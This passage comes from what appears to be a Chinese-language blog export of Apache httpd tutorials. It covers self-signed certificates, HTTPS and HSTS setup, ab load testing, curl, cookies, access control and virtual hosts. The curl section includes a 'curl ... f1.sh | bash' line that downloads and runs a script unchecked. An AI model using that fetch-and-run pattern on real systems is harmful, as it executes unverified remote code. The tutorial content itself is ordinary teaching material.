12345678910111213141516171819202122232425262728293031]# cat genca.sh#!/bin/sh# create self-signed server certificate:read -p &quot;Enter your domain [www.example.com]: &quot; DOMAINecho &quot;Create server key...&quot;openssl genrsa -des3 -out $DOMAIN.key 1024echo &quot;Create server certificate signing request...&quot;SUBJECT=&quot;/C=US/ST=Mars/L=iTranswarp/O=iTranswarp/OU=iTranswarp/CN=$DOMAIN&quot;openssl req -new -subj $SUBJECT -key $DOMAIN.key -out $DOMAIN.csrecho &quot;Remove password...&quot;mv $DOMAIN.key $DOMAIN.origin.keyopenssl rsa -in $DOMAIN.origin.key -out $DOMAIN.keyecho &quot;Sign SSL certificate...&quot;openssl x509 -req -days 3650 -in $DOMAIN.csr -signkey $DOMAIN.key -out $DOMAIN.crtecho &quot;TODO:&quot;echo &quot;Copy $DOMAIN.crt to /etc/nginx/ssl/$DOMAIN.crt&quot;echo &quot;Copy $DOMAIN.key to /etc/nginx/ssl/$DOMAIN.key&quot;echo &quot;Add configuration in nginx:&quot;echo &quot;server &#123;&quot;echo &quot; ...&quot;echo &quot; listen 443 ssl;&quot;echo &quot; ssl_certificate /etc/nginx/ssl/$DOMAIN.crt;&quot;echo &quot; ssl_certificate_key /etc/nginx/ssl/$DOMAIN.key;&quot;echo &quot;&#125;&quot;]# ./genca.shEnter your domain [www.example.com]: www.example.com]# ll-rw-r--r--. 1 root root 887 Jun 25 22:40 www.example.com.crt-rw-r--r--. 1 root root 668 Jun 25 22:40 www.example.com.csr-rw-r--r--. 1 root root 887 Jun 25 22:40 www.example.com.key-rw-r--r--. 1 root root 963 Jun 25 22:40 www.example.com.origin.key 配置虚拟主机这里需要修改一下配置文件 /usr/local/apache/conf/httpd.conf 找到下面的一行 #Include conf/extra/httpd-ssl.conf 将前面的 # 注释去掉，保存。 将上面生成的www.example.com.crt和 www.example.com.key放在/app/httpd24/conf/extra/ssl/下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960]# vim conf.d/httpd-vhost.conf&lt;VirtualHost *:80&gt; DocumentRoot "/app/httpd24/htdocs" ServerName www.example.com ErrorLog "logs/blog.com.error_log" TransferLog "logs/blog.com-access_log" DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 Header always set Strict-Transport-Security "max-age=31536000" RewriteEngine on RewriteRule ^(/wp-admin.*)$ https://%&#123;HTTP_HOST&#125;$1 [redirect=302] RewriteRule ^(/wp-login.*)$ https://%&#123;HTTP_HOST&#125;$1 [redirect=302]&lt;directory /app/httpd24/htdocs&gt;allowoverride Nonerequire all granted&lt;/directory&gt;&lt;/VirtualHost&gt;]# vim conf.d/httpd-ssl.confListen 443SSLCipherSuite HIGH:MEDIUM:!MD5:!RC4:!3DESSSLProxyCipherSuite HIGH:MEDIUM:!MD5:!RC4:!3DESSSLHonorCipherOrder on SSLProtocol all -SSLv3SSLProxyProtocol all -SSLv3SSLPassPhraseDialog builtinSSLSessionCache "shmcb:/app/httpd24/logs/ssl_scache(512000)"SSLSessionCacheTimeout 300&lt;VirtualHost _default_:443&gt;DirectoryIndex index.phpDocumentRoot "/app/httpd24/htdocs"ServerName www.example.com:443ServerAdmin you@example.comErrorLog "/app/httpd24/logs/error_log"TransferLog "/app/httpd24/logs/access_log"&lt;Directory "/app/httpd24/htdocs"&gt; Options -Indexes +FollowSymLinks AllowOverride All Require all granted&lt;/Directory&gt;AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phpsProxyRequests OffProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1SSLEngine onSSLCertificateFile "/app/httpd24/conf/extra/ssl/www.example.com.crt"SSLCertificateKeyFile "/app/httpd24/conf/extra/ssl/www.example.com.key"&lt;FilesMatch "\.(cgi|shtml|phtml|php)$"&gt; SSLOptions +StdEnvVars&lt;/FilesMatch&gt;&lt;Directory "/app/httpd24/cgi-bin"&gt; SSLOptions +StdEnvVars&lt;/Directory&gt;BrowserMatch "MSIE [2-5]" \ nokeepalive ssl-unclean-shutdown \ downgrade-1.0 force-response-1.0CustomLog "/app/httpd24/logs/ssl_request_log" \ "%t %h %&#123;SSL_PROTOCOL&#125;x %&#123;SSL_CIPHER&#125;x \"%r\" %b"&lt;/VirtualHost&gt; ]# apachectl start 域名解析好后，这里需要把你生成的证书导入到chrome下，使用 Chrome 浏览器访问http://www.example.com/wp-admin，你就会看到你的网址自动跳转https了，而且前有个可爱的小绿锁了。]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http(Apache2)]]></title>
    <url>%2Fhttpd2.html</url>
    <content type="text"><![CDATA[摘要：压力测试工具ab，访问工具curl，http状态码，https的实现过程 压力测试工具ab​ httpd的压力测试工具，这里主要介绍ab ab [OPTIONS] URL，来自httpd-tools包 options： -n：总请求数-c：模拟的并行数-k：以持久连接模式测试ulimit –n # 调整能打开的文件数 123456789101112131415161718192021222324252627282930313233]# ab -c 100 -n 2000 http://192.168.1.8/huge.txtServer Software: ApacheServer Hostname: 172.20.114.173Server Port: 80Document Path: /index.htmlDocument Length: 27 bytesConcurrency Level: 100Time taken for tests: 0.582 secondsComplete requests: 1000Failed requests: 0Write errors: 0Total transferred: 272000 bytesHTML transferred: 27000 bytesRequests per second: 1718.83 [#/sec] (mean)Time per request: 58.179 [ms] (mean)Time per request: 0.582 [ms] (mean, across all concurrent requests)Transfer rate: 456.57 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 6 27.6 3 361Processing: 5 50 105.8 17 387Waiting: 1 49 105.4 17 387Total: 12 56 108.6 22 393Percentage of the requests served within a certain time (ms) 50% 22 66% 23 75% 24 80% 24 90% 29 95% 384 98% 389 99% 390 100% 393 (longest request) ab命令在一般系统上面做测试时候，一般并发不能超过1024个，其实是因为因为系统限制每个进程打开的最大文件数为1024，可以用ulimit -a来查看 curl​ curl是基于URL语法在命令行方式下工作的文件传输工具，它支持FTP, FTPS,HTTP, HTTPS, GOPHER, TELNET, DICT, FILE及LDAP等协议。curl支持HTTPS认证，并且支持HTTP的POST、PUT等方法， FTP上传， kerberos认证，HTTP上传，代理服务器，cookies，用户名/密码认证， 下载文件断点续传，上载文件断点续传, http代理服务器管道（ proxy tunneling），还支持IPv6，socks5代理服务器，通过http代理服务器上传文件到FTP服务器等，功能十分强大. 1234567891011121314]# curl -I 192.168.1.8]# curl -v 192.168.1.8]# curl -A "ie20" 192.168.1.8]# curl -e "www.baidu.com" 192.168.1.8]# curl http://192.168.1.8/f1.sh -O]# curl http://192.168.1.8/f1.sh -o f11.sh]# curl http://192.168.1.8/f1.sh |bash]# curl -c cookie.txt 192.168.1.8/setcookie.php ]# cat cookie.txt # Netscape HTTP Cookie File# http://curl.haxx.se/docs/http-cookies.html# This file was generated by libcurl! Edit at your own risk.192.168.1.8 FALSE / FALSE 0 title ceo192.168.1.8 FALSE / FALSE 1529553543 name wang HTTP协议相关​ http请求报文的模拟状态 1234567891011121314151617]#telnet 192.168.1.8 80Trying 192.168.1.8...Connected to 192.168.1.8.Escape character is &apos;^]&apos;.GET /index.html HTTP/1.1host: 2.2.2.2 //需要enter两下，提交报文HTTP/1.1 200 OKDate: Thu, 21 Jun 2018 06:37:23 GMTServer: ApacheLast-Modified: Thu, 21 Jun 2018 06:28:49 GMTETag: &quot;11-56f210742b912&quot;Accept-Ranges: bytesContent-Length: 17Content-Type: text/html; charset=UTF-8welcome to hong~ ​ http响应报文状态的获取查看，利用curl -I URL 123456789]#curl -I 192.168.1.8HTTP/1.1 200 OKDate: Thu, 21 Jun 2018 06:19:20 GMTServer: ApacheLast-Modified: Wed, 20 Jun 2018 15:29:42 GMTETag: &quot;e-56f1477b8b86d&quot;Accept-Ranges: bytesContent-Length: 14Content-Type: text/html; charset=UTF-8 协议查看或分析的工具：tcpdump, wireshark,tshark http状态码​ 常见代码如下： 123451xx：100-101 信息提示2xx：200-206 成功3xx：300-305 重定向4xx：400-415 错误类信息，客户端错误5xx：500-505 错误类信息，服务器端错误 ​ 详细状态码如下：1234567891011200： 成功，请求数据通过响应报文的entity-body部分发送;OK301： 请求的URL指向的资源已经被删除；但在响应报文中通过首部Location指明了资源现在所处的新位置；Moved Permanently302： 响应报文Location指明资源临时新位置 Moved Temporarily304： 客户端发出了条件式请求，但服务器上的资源未曾发生改变，则通过响应此响应状态码通知客户端；Not Modified401： 需要输入账号和密码认证方能访问资源；Unauthorized403： 请求被禁止；Forbidden404： 服务器无法找到客户端请求的资源；Not Found500： 服务器内部错误；Internal Server Error502： 代理服务器从后端服务器收到了一条伪响应，如无法连接到网关；BadGateway503: 服务不可用，临时服务器维护或过载，服务器无法处理请求504: 网关超时 Cookie​ HTTP 是一种无状态协议。协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。可是随着 Web 的不断发展，很多业务都需要对通信状态进行保存。于是引入了 Cookie 技术。使用 Cookie 的状态管理Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。 123456789101112131415161718192021222324252627]# yum install php]# cd /var/www/html]# vim setcookie.php&lt;?php&gt;setcookie(&quot;title&quot;,&apos;ceo&apos;);setcookie(&quot;name&quot;,&apos;wang&apos;,time()+86400);?&gt;]# systemctl restart httpd]# curl -v 192.168.1.8/setcookie.php* About to connect() to 192.168.1.8 port 80 (#0)* Trying 192.168.1.8...* Connected to 192.168.1.8 (192.168.1.8) port 80 (#0)&gt; GET /setcookie.php HTTP/1.1&gt; User-Agent: curl/7.29.0&gt; Host: 192.168.1.8&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Thu, 21 Jun 2018 06:40:31 GMT&lt; Server: Apache&lt; X-Powered-By: PHP/5.4.16&lt; Set-Cookie: title=ceo&lt; Set-Cookie: name=wang; expires=Fri, 22-Jun-2018 06:40:32 GMT&lt; Content-Length: 0&lt; Content-Type: text/html; charset=UTF-8&lt; * Connection #0 to host 192.168.1.8 left intact HTTPS https：http over ssl SSL会话的简化过程 客户端发送可供选择的加密方式，并向服务器请求证书 服务器端发送证书以及选定的加密方式给客户端 客户端取得证书并进行证书验证,如果信任给其发证书的CA: 验证证书来源的合法性；用CA的公钥解密证书上数字签名 验证证书的内容的合法性：完整性验证 检查证书的有效期限 检查证书是否被吊销 证书中拥有者的名字，与访问的目标主机要一致 客户端生成临时会话密钥（对称密钥），并使用服务器端的公钥加密此数据发送给服务器,完成密钥交换 服务用此密钥加密用户请求的资源，响应给客户端 注意：SSL是基于IP地址实现,单IP的主机仅可以使用一个https虚拟主机 实验：模拟https的实现过程​ https服务器的实现过程，生成ssl文件夹，放置证书相关文件，然后发送申请文件，等待CA发送httpd.cert证书。 123456789101112131415161718192021222324252627]# mkdir /etc/httpd/conf.d/ssl]# cd /etc/httpd/conf.d/ssl]# (umask 077;openssl genrsa -out httpd.key 1024)Generating RSA private key, 1024 bit long modulus.....................................................++++++...........................++++++e is 65537 (0x10001)]#openssl req -new -key httpd.key -out httpd.csrCountry Name (2 letter code) [XX]:CNState or Province Name (full name) []:beijingLocality Name (eg, city) [Default City]:beijingOrganization Name (eg, company) [Default Company Ltd]:httpdOrganizational Unit Name (eg, section) []:optCommon Name (eg, your name or your server&apos;s hostname) []:www.httpd.comEmail Address []:Please enter the following &apos;extra&apos; attributesto be sent with your certificate requestA challenge password []:An optional company name []:ssl]#scp httpd.csr 192.168.1.11:/etc/pki/CA/The authenticity of host &apos;192.168.1.11 (192.168.1.11)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:rwE9SvvRx3QSIGMK/vhD6ta3/HdDO4BykxP4Mumjs00.ECDSA key fingerprint is MD5:31:d3:62:71:12:6a:f6:88:69:a4:95:4e:15:57:48:0a.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;192.168.1.11&apos; (ECDSA) to the list of known hosts.root@192.168.1.11&apos;s password: httpd.csr 100% 651 435.0KB/s 00:00 ​ CA颁发证书过程，先自签名证书，csr申请的信息必须与rootca前面的信息一致。 1234567891011121314]# cd /etc/pki/CA/]# (umask 077;openssl genrsa -out private/cakey.pem 2048)Generating RSA private key, 2048 bit long modulus.+++.....................................................+++e is 65537 (0x10001)]#openssl req -new -x509 -key private/cakey.pem -out cacert.pem -days 3650Country Name (2 letter code) [XX]:CNState or Province Name (full name) []:beijingLocality Name (eg, city) [Default City]:beijingOrganization Name (eg, company) [Default Company Ltd]:httpdOrganizational Unit Name (eg, section) []:optCommon Name (eg, your name or your server&apos;s hostname) []:ca.httpd.comEmail Address []: ​ 然后rootCA签署httpd.csr,生成httpd.crt，再发送到https服务器12345678910111213141516171819202122232425]# touch index.txt]# echo 01 &gt; serial]#openssl ca -in httpd.csr -out certs/http.crt -days 720Using configuration from /etc/pki/tls/openssl.cnfCheck that the request matches the signatureSignature ok]#tree.├── cacert.pem├── certs│ └── http.crt├── crl├── httpd.csr├── index.txt├── index.txt.attr├── index.txt.old├── newcerts│ └── 01.pem├── private│ └── cakey.pem├── serial└── serial.old]#scp certs/http.crt 192.168.1.8:/etc/httpd/conf.d/ssl/root@192.168.1.8&apos;s password: http.crt 100% 3699 2.2MB/s 00:00 ​ https服务器收到证书后，安装install mod_ssl,修改相关的配置文件，开启https服务123456]# yum install mod_ssl]# vim /etc/httpd/conf.d/ssl.confSSLCertificateFile /etc/httpd/conf.d/ssl/httpd.crtSSLCertificateKeyFile /etc/httpd/conf.d/ssl/httpd.keySSLCACertificateFile /etc/httpd/conf.d/ssl/cacert.pem]# systemctl restart httpd ​ 实验验证,在图形界面下访问,简单的添加hosts文件，实现免dns解析。 123]# vim /etc/hosts/192.168.1.8 www.httpd.com]# firefox https://www.httpd.com ​ 可能这里在浏览器里，大家看到的提示依旧不安全，这是因为证书没有导入的信任的缘故。导入证书即可变绿加🔒 http 重定向到 https​ 将http请求转发至https的URL ​ Redirect [status] URL-path URL 123]# vim /etc/httpd/conf.d/test.confredirect Permanent / https://www.httpd.com/]# systemctl restart httpd 利用curl命令验证一下,的确进行了跳转。 123456]#curl -I http://192.168.1.8/HTTP/1.1 301 Moved PermanentlyDate: Thu, 21 Jun 2018 08:22:49 GMTServer: ApacheLocation: https://www.httpd.com/Content-Type: text/html; charset=iso-8859-1 HSTS HSTS:HTTP Strict Transport Security 服务器端配置支持HSTS后，会在给浏览器返回的HTTP首部中携带HSTS字段。浏览器获取到该信息后，会将所有HTTP访问请求在内部做307跳转到HTTPS。而无需任何网络过程 HSTS preload list 是Chrome浏览器中的HSTS预载入列表，在该列表中的网站，使用Chrome浏览器访问时，会自动转换成HTTPS。Firefox、Safari、Edge浏览器也会采用这个列表 12345]# vim /etc/httpd/conf.d/test.confHeader always set Strict-Transport-Security &quot;max-age=31536000&quot;RewriteEngine onRewriteRule ^(/.*)$ https://%&#123;HTTP_HOST&#125;$1 [redirect=302]]# systemctl restart httpd ​ 实验验证一下，的确进行了跳转。 1234567]#curl -I http://192.168.1.8/HTTP/1.1 302 FoundDate: Thu, 21 Jun 2018 08:19:20 GMTServer: ApacheStrict-Transport-Security: max-age=31536000Location: https://192.168.1.8/Content-Type: text/html; charset=iso-8859-1]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http(Apache1)]]></title>
    <url>%2Fhttpd1.html</url>
    <content type="text"><![CDATA[摘要：Apache的httpd服务常见配置解析，配置文件的实验—- httpd 2.4常见配置grep -v &#39;^$\|^\s*#&#39; /etc/httpd/conf/httpd.conf,查看配置文件的非注释内容。 网站家目录/服务器版本/监听端口的修改centos7版本的http服务，更换documentroot的时候，需要放开权限，才能实现访问，不然会报404错误，另外apache服务的版本号的隐藏，在ServerTokens语句块中，修改为Prod即可,很多大型的网站，如京东，淘宝，apache或者nginx的版本号都会隐藏。监听端口的配置修改，配置文件中加入listen 80，http监听端口默认80 1234567891011121314151617181920212223]# vim /etc/httpd/conf.d/test.confServerRoot '/etc/httpd'ServerTokens Prod #curl -I http://192.168.1.8listen 192.168.1.8:80StartServers 20StartThreads 50DocumentRoot "/data/www/"&lt;Directory "/data/www"&gt;&lt;RequireAll&gt; Require all granted Require not ip 192.168.1.17&lt;/RequireAll&gt;&lt;/Directory&gt;]# systemctl restart httpd]#curl -I 192.168.1.8HTTP/1.1 200 OKDate: Wed, 20 Jun 2018 11:38:30 GMTServer: ApacheLast-Modified: Wed, 20 Jun 2018 11:37:49 GMTETag: "6-56f113a6fe504"Accept-Ranges: bytesContent-Length: 6Content-Type: text/html; charset=UTF-8 在禁止访问的主机ip为192.168.1.11上访问,会出现Forbidden 403，在其他的授权主机上即可正常访问。 123456789]#curl -I 192.168.1.8HTTP/1.1 403 ForbiddenDate: Wed, 20 Jun 2018 11:39:39 GMTServer: ApacheLast-Modified: Thu, 16 Oct 2014 13:20:58 GMTETag: &quot;1321-5058a1e728280&quot;Accept-Ranges: bytesContent-Length: 4897Content-Type: text/html; charset=UTF-8 持久链接系统默认的持久链接为5s，时间较短，可以稍微调大。 1234567]# vim /etc/httpd/conf.d/test.confKeepAlivetimeout 50 #持久链接MaxKeepAliveRequests 100]# systemctl restart httpd]# telnet /192.168.1.8 HTTP/1.1GET /index.htmlHOST:6.6.6.6 MPM三种工作模式 refork：多进程I/O模型，每个进程响应一个请求，默认模型一个主进程：生成和回收n个子进程，创建套接字，不响应请求多个子进程：工作work进程，每个子进程处理一个请求；系统初始时，预先生成多个空闲进程，等待请求，最大不超过1024个 worker：复用的多进程I/O模型,多进程多线程，IIS使用此模型一个主进程：生成m个子进程，每个子进程负责生个n个线程，每个线程响应一个请求，并发响应请求：m*n event：事件驱动模型（worker模型的变种）一个主进程：生成m个子进程，每个进程直接响应n个请求，并发响应请求：m*n，有专门的线程来管理这些keep-alive类型的线程，当有真实请求时，将请求传递给服务线程，执行完毕后，又允许释放。这样增强了高并发场景下的请求处理能力，示意图入下 修改配置文件/etc/httpd/conf.modules.d/00-mpm.conf，改变MPM工作模式123LoadModule mpm_prefork_module modules/mod_mpm_prefork.so#LoadModule mpm_worker_module modules/mod_mpm_worker.so#LoadModule mpm_event_module modules/mod_mpm_event.so 经ab测试比对，发现prefork和event模块工作并无大的差别。 访问控制基于用户的访问控制 认证质询：WWW-Authenticate：响应码为401，拒绝客户端请求，并说明要求客户端提供账号和密码 认证：Authorization：客户端用户填入账号和密码后再次发送请求报文；认证通过时，则服务器发送响应的资源 认证方式两种： basic：明文digest：消息摘要认证,兼容性差 安全域：需要用户认证后方能访问的路径；应该通过名称对其进行标识，以便于告知用户认证的原因 1234567891011121314151617&lt;Directory "/data/www"&gt;&lt;RequireAll&gt; Require all granted&lt;/ReqireAll&gt;&lt;/Directory&gt;&lt;Files "*.conf"&gt; Require all denied&lt;/Files&gt;&lt;Filesmatch "\.(conf|ini)$"&gt; Require all denied&lt;/Filesmatch&gt;&lt;Location "/conf"&gt;&lt;RequireAny&gt; Require all denied Require ip 192.168.1.11&lt;/RequireAny&gt;&lt;/Location&gt; 完成配置文件后，重启服务，进行实验效果,在其他主机上进行访问，.conf文件的确不能访问。 1234567891011]#curl 192.168.1.8/php.conf&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don&apos;t have permission to access /php.confon this server.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;]#curl 192.168.1.8/index.htmltest1 中“基于源地址”实现访问控制 options：禁止软连接-FollowSymlinks Indexes:文件索引列表，搭建yum仓库可以用到,此项结合注释conf.d/welcome.conf,不然会报错 12345678]# vim /etc/httpd/conf.d/test.conf&lt;Directory &quot;/data/www&quot;&gt; Require all granted options +Indexes -FollowSymlinks&lt;/Directory&gt;]# ll /data/wwwtotal 24lrwxrwxrwx 1 root root 11 Jun 20 20:06 hexo -&gt; /data/hexo/ 重启服务后，进行访问实验,hexo文件夹为软连接,禁用软连接后，文件夹不能访问了。indexes的确是类似yum仓库的路径。 123]# links 192.168.1.8/hexoForbiddenYou don&apos;t have permission to access /hexo/ on this server. AllowOverride:与访问控制相关的哪些指令可以放在指定目录下的.htaccess（由AccessFileName指定）文件中，覆盖之前的配置指令,只对语句有效 123AllowOverride All: 所有指令都有效AllowOverride None：.htaccess 文件无效AllowOverride AuthConfig Indexes 除了AuthConfig 和Indexes的其它指令都无法覆盖 身份验证 htpasswd :默认是MD5加密 htpasswd [options] /PATH/HTTPD_PASSWD_FILE username-c：自动创建文件，仅应该在文件不存在时使用-p：明文密码-d：CRYPT格式加密，默认-m：md5格式加密-s: sha格式加密-D：删除指定用户 group需要手动创建 我们需要先按照htpassword生成用户名和密码。第一次需要带-c选项1234567]# htpasswd -c /etc/httpd/conf.d/.httpuser tom]# htpasswd -s /etc/httpd/conf.d/.httpuser jerry]# cat /etc/httpd/conf.d/.httpuser user1:$apr1$O8G3R9KG$AjOvrOCyxNGXZC6Sm.Kx3.user2:&#123;SHA&#125;QL0AFWMIX8NRZTKeof9cXsvbvu8=]# vim /etc/httpd/conf.d/.httpgroupg1: tom jerry 修改配置文件如下，然后重启服务，用户访问需要用到上面设置的用户和密码进行登录验证，由于是基于http服务，并没有加密，因此，容易被劫持然后被查询明文密码，是巨大的安全隐患。此项一般是配合https进行实现；实现方法1 12345678]# vim /etc/httpd/conf.d/test.conf&lt;Directory &quot;/data/www/admin&quot;&gt; AuthType Basic AuthName &quot;String&quot; AuthUserFile &quot;/etc/httpd/conf.d/.httpuser&quot; Require user tom jerry&lt;/Directory&gt;]# systemctl restart httpd 实现方法2 1234567891011]# vim /etc/httpd/conf.d/test.conf&lt;Directory &quot;/data/www/admin&quot;&gt;allowoverride authconfig&lt;/Directory&gt;]# vim /data/www/admin/.htaccessAuthType BasicAuthName &quot;String&quot;AuthUserFile &quot;/etc/httpd/conf.d/.httpuser&quot;#AuthGroupFile &quot;/etc/httpd/conf.d/.httpgroup&quot;#Require group g1Require user tom jerry 日志1234567891011ErrorLog &quot;logs/error_log&quot;LogLevel warn&lt;IfModule log_config_module&gt; LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common%h ---&gt; 主机IP%l %u ---&gt; 登录相关用户信息%t ---&gt; 时间格式GMT%r ---&gt; 第一行的请求%&#123;Referer&#125;i ---&gt; 前一网站跳转的地址%&#123;User-Agent&#125;i ---&gt; 客户端使用的浏览器 目录别名格式： Alias /URL/ &quot;/PATH/&quot; 12345]# vim /etc/httpd/conf.d/test.conf&lt;Directory &quot;/data/hexo/categories&quot;&gt; Require all granted&lt;/Directory&gt;alias /hc /data/hexo/categories 访问http://192.168.1.8/hc/，即相当于访问系统的path：/data/hexo/categories 实现用户家目录的http共享 基于模块mod_userdir.so实现 SELinux: http_enable_homedirs 相关设置：启用家目录http共享,配置文件如下，并只允许特定user访问，但是基于http仍然存在安全隐患 12345678910111213]# vim /etc/httpd/conf.d/userdir.conf···&lt;IfModule mod_userdir.c&gt;#UserDir disabledUserDir public_html #指定共享目录的名称···&lt;/IfModule&gt;&lt;Directory &quot;/home/hong/public_html&quot;&gt; AuthType Basic AuthName &quot;hong home dir&quot; AuthUserFile &quot;/etc/httpd/conf.d/.httpuser&quot; Require user hong &lt;/Directory&gt; 准备家目录的相关文件及权限。 12su - hong;mkdir ~/public_html；echo welcome to hong~ &gt; ~/public_html/index.htmlsetfacl –m u:apache:x ~hong 访问:http://localhost/~hong/index.html server-statusLoadModule: status_module ,在配置文件中modules/mod_status.so，可以用httpd -M查看。 实现状态页 123456789]# httpd -M |grep &apos;status&apos;status_module (shared)]# vim /etc/httpd/conf.d/test.conf&lt;Location /status&gt; #url路径SetHandler server-statusOrder allow,denyAllow from 192.168.&lt;/Location&gt;]# systemctl restart httpd 压力测试，并在浏览器中查询服务器状态http://localhost/status 1]# ab -c 500 -n 20000 http://192.168.1.8/m.txt 虚拟主机 站点标识： socket IP相同，但端口不同IP不同，但端口均为默认端口FQDN不同： 请求报文中首部 Host: www.magedu.com 有三种实现方案：基于ip：为每个虚拟主机准备至少一个ip地址基于port：为每个虚拟主机使用至少一个独立的port基于FQDN：为每个虚拟主机使用至少一个FQDN 注意：一般虚拟机不要与main主机混用；因此，要使用虚拟主机，一般先禁用main主机禁用方法：注释中心主机的DocumentRoot指令即可 准备工作 1234]#mkdir /data/web&#123;1,2,3&#125;]#echo www.test1.com &gt; /data/web1/index.html]#echo www.test2.com &gt; /data/web2/index.html]#echo www.test3.com &gt; /data/web3/index.html 实验一：基于Port更改端口，完成虚拟主机的服务。默认已经完成准备工作 12345678910111213141516171819202122232425]# vim /etc/httpd/conf.d/test.conflisten 81listen 82listen 83&lt;directory /data/&gt;require all granted&lt;/directory&gt;&lt;VirtualHost *:81&gt; DocumentRoot &quot;/data/web1&quot; ServerName www.test1.com ErrorLog &quot;logs/test1.com.error_log&quot; TransferLog &quot;logs/test1.com-access_log&quot;&lt;/VirtualHost&gt;&lt;VirtualHost *:82&gt; DocumentRoot &quot;/data/web2&quot; ServerName www.test2.com ErrorLog &quot;logs/test2.com.error_log&quot; TransferLog &quot;logs/test2.com-access_log&quot;&lt;/VirtualHost&gt;&lt;VirtualHost *:83&gt; DocumentRoot &quot;/data/web3&quot; ServerName www.test3.com ErrorLog &quot;logs/test3.com.error_log&quot; TransferLog &quot;logs/test3.com-access_log&quot;&lt;/VirtualHost&gt; ​ 在另外一台主机上，验证实验结果 123456]# curl http://192.168.1.8:81www.test1.com]#curl http://192.168.1.8:82www.test2.com]#curl http://192.168.1.8:83www.test3.com 实验二：基于IP的虚拟主机,​ 先添加3个ip，这里采用的是ifconfig。然后修改配置文件，主要修改&lt;VirtualHost 192.168.1.11:80&gt; 12345678910111213141516171819202122232425]# ifconfig ens33:0 192.168.1.11 netmask 255.255.255.0 up]# ifconfig ens33:1 192.168.1.22 netmask 255.255.255.0 up]# ifconfig ens33:2 192.168.1.33 netmask 255.255.255.0 up]# vim /etc/httpd/conf.d/test.conf&lt;directory /data/&gt;require all granted&lt;/directory&gt;&lt;VirtualHost 192.168.1.11:80&gt; DocumentRoot &quot;/data/web1&quot; ServerName www.test1.com ErrorLog &quot;logs/test1.com.error_log&quot; TransferLog &quot;logs/test1.com-access_log&quot;&lt;/VirtualHost&gt;&lt;VirtualHost 192.168.1.22:80&gt; DocumentRoot &quot;/data/web2&quot; ServerName www.test2.com ErrorLog &quot;logs/test2.com.error_log&quot; TransferLog &quot;logs/test2.com-access_log&quot;&lt;/VirtualHost&gt;&lt;VirtualHost 192.168.1.33:80&gt; DocumentRoot &quot;/data/web3&quot; ServerName www.test3.com ErrorLog &quot;logs/test3.com.error_log&quot; TransferLog &quot;logs/test3.com-access_log&quot;&lt;/VirtualHost&gt; ​ 在另外一台主机上，验证实验结果 123456]#curl 192.168.1.11www.test1.com]#curl 192.168.1.22www.test2.com]#curl 192.168.1.33www.test3.com 实验三：FQDN​ 配置文件的更改，这里主要是的更改ServerName 12345678910111213141516171819202122]# vim /etc/httpd/conf.d/test.conf &lt;directory /data/&gt;require all granted&lt;/directory&gt;&lt;VirtualHost *:80&gt; DocumentRoot &quot;/data/web1&quot; ServerName www.test1.com ErrorLog &quot;logs/test1.com.error_log&quot; TransferLog &quot;logs/test1.com-access_log&quot;&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; DocumentRoot &quot;/data/web2&quot; ServerName www.test2.com ErrorLog &quot;logs/test2.com.error_log&quot; TransferLog &quot;logs/test2.com-access_log&quot;&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; DocumentRoot &quot;/data/web3&quot; ServerName www.test3.com ErrorLog &quot;logs/test3.com.error_log&quot; TransferLog &quot;logs/test3.com-access_log&quot;&lt;/VirtualHost&gt; ​ 在另外一台主机进行验证结果,不过基于主机的配置，需要DNS解析；这里为了方便，直接在hosts文件做名词解析；直接curl 192.168.1.8，这里/var/www/html已经失效，会默认访问基于虚拟主机的第一个网站 12345678910]#vim /etc/hosts192.168.1.8 www.test1.com www.test2.com www.test3.com]#curl www.test1.comwww.test1.com]#curl www.test2.comwww.test2.com]#curl www.test3.comwww.test3.com]#curl 192.168.1.8www.test1.com]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http(Apache)]]></title>
    <url>%2Fhttpd.html</url>
